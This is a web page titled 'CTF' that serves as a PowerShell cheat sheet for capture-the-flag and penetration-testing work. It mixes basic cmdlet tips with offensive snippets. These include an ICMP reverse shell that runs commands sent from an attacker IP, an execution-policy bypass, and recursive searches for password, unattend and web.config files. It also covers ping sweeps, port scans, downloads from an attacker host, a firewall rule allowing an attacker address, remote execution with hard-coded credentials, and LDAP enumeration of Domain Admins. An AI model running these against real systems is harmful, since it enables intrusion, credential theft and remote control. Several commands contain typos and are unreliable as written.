---
layout: page
title: CTF
permalink: /ctf/
---

PowerShell

Start a session without a profile and bypassing no execution
`powershell.exe -nop -exec bypass`

Get a directory listing (ls, dir, gci):
`PS C:\> Get-ChildItem`

Copy a file (cp, copy, cpi):
`PS C:\> Copy-Item src dst`

Find text within a file:
`PS C:\> Select-String -path c:\users\*.txt -pattern password`

`PS C:\> ls -r c:\users -file | %{Select-String -path $_ -pattern password}`

Display file contents (cat, type, gc):
`PS c:\> Get-Content file.txt`

Get current directory (pwd, gl):
`PS C:\> Get-Location`

Get a process listing (ps, gps):
`PS c:\> Get-Process`

Get a service listing:
`PS C:\> Get-Service`

Formatting output of a command (Format-List, fl):
`PS c:\> ls | Format-List -property name`

Paginating output:
`PS C:\> ls -r | Out-Host -paging`

Get SHA1 hash of a file:
`PS C:\> Get-FileHash -Algorithm SHA1 file`

Export output to CSV:
`PS C:\> GetProcess | Export-Csv procs.csv`

Conduct a ping sweep:
`PS C:\> 1..255 | % (echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}`
```
powershell -nop -c "$ip='your_ip'; $ic = New-Object System.Net.NetworkInformation.Ping; $po = New-Object System.Net.NetworkInformation.PingOptions; $po.DontFragment = $true; $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes('OK'), $po); while ($true) { $ry = $ic.Send($ip,60*1000, ([text.encoding]::ASCII).GetBytes(''), $po); if ($ry.Buffer) { $rs = ([text.encoding]::ASCII).GetString($ry.Buffer); $rt = (Invoke-Expression -Command $rs | Out-String ); $ic.Send($ip,60*1000,([text.encoding]::ASCII).GetBytes($rt),$po); } }"
```

Conduct a port scan:
`PS c:\> 1..1024 | % {echo ((new-object Net.sockets.TcpClient).Connect ("10.10.10.10",$_)) "Port is open!"} 2>$null`

Fetch a file via HTTP:
`PS C:\> (New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/file.exe", "file.exe")`
`PS C:\> Invoke-WebRequest -Outfile C:\place\to\put http://IP/filetoget`

Find files with a specific name:
`PS C:\> Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt`
`PS C:\> Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}`
`PS C:\> Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue`
`PS C:\> Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue`
`PS C:\> Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"`

Get a listing of all installed Microsoft Hotfixes:
`PS C:\> Get-Hotfix`

Navigate the Windows Registry:
`PS C:\> cd HKLM:\`
`PS HKLM:\> ls`

List programs that start automatically in the registry:
`PS C:\> Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run`

Convert String from ascii to Base64:
`PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8GetBytes("PS Encode me!""))`

NETWORKING
`PS C:\> Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address`
`PS C:\> Get-DnsClientServerAddress -AddressFamily IPv4 | ft`
`PS C:\> Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex`
`PS C:\> Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State`
`PS C:\> Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse`

List and modify the windows firewall rules:
`PS C:\> Get-NewFirewallRule -all`
`PS C:\> New-FirewallRule -Action Allow -DisplayName ItsaMe -RemoteAddress 10.10.10.99`

INFO ON CMDLETS/MODULES
```
PS C:\> Get-Help <cmdlet>
PS C:\> Get-Help <cmdlet> -detailed
PS C:\> Get-Help <cmdlet> -examples
PS C:\> Get-Help <cmdlet> -full
PS C:\> Get-Command -Module modulename
```

Get-Command supports filtering. To filter cmdlets on the verb set:
```
PS C:\> Get-Command Set*
PS C:\> Get-Command –Verb Set

Or on the noun process:
PS C:\> Get-Command *Process
PS C:\> Get-Command –Noun process
```

Piping cmdlet output to another cmdlet:
`PS C:\> Get-Process | Format-List –property name`

ForEach-Object in the pipeline (alias %):
`PS C:\> ls *.txt | ForEach-Object {cat $_}`

Where-Object condition (alias where or ?):
`PS C:\> Get-Process | Where-Object {$_.name –eq "notepad"}`


Generating ranges of numbers and looping:
`PS C:\> 1..10`
`PS C:\> 1..10 | % {echo "Hello!"}`


Creating and listing variables:
`PS C:\> $tmol = 42`
`PS C:\> ls variable:`

Examples of passing cmdlet output down pipeline:
`PS C:\> dir | group extension | sort`
`PS C:\> Get-Service dhcp | Stop-Service -PassThru | Set-Service -StartupType Disabled`

ADDING MODULES TO SESSION
`PS C:\> Import-Module C:\Path\to\name.ps1`

INVOKE COMMAND -ICM
`PS C:\> Invoke-Command -ComputerName <name> -ScriptBlock {whoami}
$username = 'DOMAIN\USERNAME'; $password = 'PASSWORD'; $securePassword = ConvertTo-SecureString $password -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential $username,$securePassword; Invoke-Command -ComputerName BOX01 -Credential $credential -ScriptBlock {whoami};`

GET LANGUAGE MODE
`PS C:\> $ExecutionContext.SessionState.LanguageMode`

x86 or x64
`PS C:\> [IntPtr]::size`

ENVIRONMENT VARIABLES
`PS C:\> Get-ChildItem Env: | ft Key,Value`
`PS C:\> $env:UserName`

CONNECTED DRIVES
`PS C:\> Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root`

LDAP
```
PS C:\> $username = 'lab.local\LDAP'; $password = 'PASSWORD'; $DomainControllerIpAddress = 'IP'; $LdapDn = 'DC=lab,DC=local'; $dn = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$($DomainControllerIpAddress):389/$LdapDn", $username, $password); $ds = New-Object System.DirectoryServices.DirectorySearcher($dn); $ds.SearchRoot;
    $ds.Filter ="((objectCategory=computer))"; $ds.FindAll();
    $ds.Filter ="((objectCategory=user))"; $ds.FindAll();
    $ds.filter = "(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=lab,dc=local))"; $ds.FindAll();
    $ds.Filter ="((name=Administrator))"; $ds.FindAll().properties;
    $ds.Filter ="((name=Bob*))"; $ds.FindAll().properties;
```

UAC
`$secpasswd = ConvertTo-SecureString "1234test" -AsPlainText -Force; $mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd); $computer = "BOXNAME"; [System.Diagnostics.Process]::Start("C:\temp\file.bat",$mycreds.Username,$mycreds.Password,$computer)`



